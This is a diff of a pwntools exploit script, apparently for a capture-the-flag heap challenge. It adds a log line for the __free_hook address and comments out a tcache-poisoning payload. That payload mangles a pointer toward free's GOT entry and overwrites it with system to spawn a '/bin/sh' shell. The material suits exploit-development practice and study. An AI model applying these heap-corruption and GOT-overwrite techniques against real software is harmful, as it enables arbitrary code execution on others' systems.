@@ -115,6 +115,7 @@ for i in range(1, 8):
     rm(i)
 
 context.log_level = 'DEBUG'
+log.info(f"{libc.symbols['__free_hook']=:#x}")
 
 # payload = p64(mangle(heap, libc.symbols["__free_hook"])) + b"\xff"
 # cheat(7, payload, 7)
@@ -124,15 +125,15 @@ context.log_level = 'DEBUG'
 # add(2, payload + b"\xff", 0x7f)
 # rm(1)
 
-payload = p64(mangle(heap, elf.got["free"] - 0x8)) + b"\xff"
-cheat(7, payload, 7)
-
-ret_gadget = 0x401E48
-add(1, b"/bin/sh\x00\xff", sz)
-payload = flat(libc.address + 0x1e19d0,
-               elf.plt["system"])
-add(2, payload + b"\xff", sz)
-rm(1)
+# payload = p64(mangle(heap, elf.got["free"] - 0x8)) + b"\xff"
+# cheat(7, payload, 7)
+#
+# ret_gadget = 0x401E48
+# add(1, b"/bin/sh\x00\xff", sz)
+# payload = flat(libc.address + 0x1e19d0,
+#                elf.plt["system"])
+# add(2, payload + b"\xff", sz)
+# rm(1)
 
 context.log_level = 'INFO'
 io.interactive()
